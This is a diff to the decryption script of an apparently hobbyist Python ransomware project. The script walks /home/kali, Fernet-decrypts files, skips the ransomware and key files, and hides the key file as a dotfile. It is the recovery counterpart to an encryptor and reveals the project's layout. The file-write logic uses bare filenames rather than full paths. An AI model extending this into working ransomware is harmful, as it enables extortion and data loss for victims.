@@ -3,12 +3,12 @@ from cryptography.fernet import Fernet
 
 main_dir = "/home/kali"
 
-with open("encrypt.key", "rb") as key:
+with open(".encrypt.key", "rb") as key:
     decrypt_key = key.read()
 
 for subdir, dirs, files in os.walk(main_dir):
     for file in files:
-        if file == "ransomware.py" or file == "decrypt.py" or file == "encrypt.key":
+        if file == "ransomware.py" or file == "decrypt.py" or file == ".encrypt.key":
             continue
         else:
             try:
@@ -16,6 +16,6 @@ for subdir, dirs, files in os.walk(main_dir):
                     contents = usrFile.read()
                 encrypted_content = Fernet(decrypt_key).decrypt(contents)
                 with open(file, "wb") as usrFile:
-                    usrFile.write(encrypted_content)
+                    usrFile.write(encrypted_content) #Decrypts files except for root files
             except:
                 pass
